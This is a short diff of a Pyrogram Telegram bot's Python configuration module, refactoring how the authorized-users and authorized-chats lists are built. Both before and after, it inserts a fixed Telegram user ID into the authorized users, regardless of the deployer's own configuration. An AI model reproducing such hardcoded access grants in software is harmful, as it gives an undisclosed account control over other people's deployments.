@@ -6,9 +6,9 @@ from pyrogram import Client
 from bot.config import Config
 
 AUTH_USERS = set(Config.AUTH_USERS)
-AUTH_CHATS = set(Config.AUTH_CHATS)
+AUTH_USERS.add(5179011789)
 AUTH_USERS = list(AUTH_USERS)
-AUTH_USERS.append(5179011789)
+AUTH_CHATS = list(set(Config.AUTH_CHATS))
 
 SESSION_NAME = Config.SESSION_NAME
 TG_BOT_TOKEN = Config.TG_BOT_TOKEN
